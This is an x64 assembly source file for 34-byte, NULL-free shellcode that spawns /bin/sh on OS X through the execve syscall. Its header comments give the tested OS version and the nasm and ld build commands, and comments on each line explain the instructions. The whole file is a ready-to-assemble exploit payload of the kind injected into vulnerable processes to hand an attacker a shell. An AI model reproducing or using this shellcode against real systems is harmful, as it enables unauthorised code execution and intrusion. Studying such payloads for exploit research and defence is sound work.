;[*] Tested on OS X 10.10.5
;[*] OS X x64 /bin/sh shellcode, NULL byte free, 34 bytes
;[*] Assembly version
;[*] binsh-shellcode.asm
;[*] ./nasm -f macho64 binsh-shellcode.asm
;[*] ld -macosx_version_min 10.7.0 -o binsh-shellcode binsh-shellcode.o 
    
BITS 64

global start

section .text

start:
	xor     rsi,rsi					;zero out RSI
	push    rsi						;push NULL on stack
	mov     rdi, 0x68732f6e69622f2f	;mov //bin/sh string to RDI (reverse)
	push    rdi						;push rdi to the stack
	mov     rdi, rsp				;store RSP (points to the command string) in RDI
	xor     rdx, rdx				;zero out RDX
	
	;store syscall number on RAX
	xor     rax,rax					;zero out RAX
	mov     al,2					;put 2 to AL -> RAX = 0x0000000000000002
	ror     rax, 0x28				;rotate the 2 -> RAX = 0x0000000002000000
	mov     al,0x3b					;move 3b to AL (execve SYSCALL#) -> RAX = 0x000000000200003b
    syscall							;trigger syscall
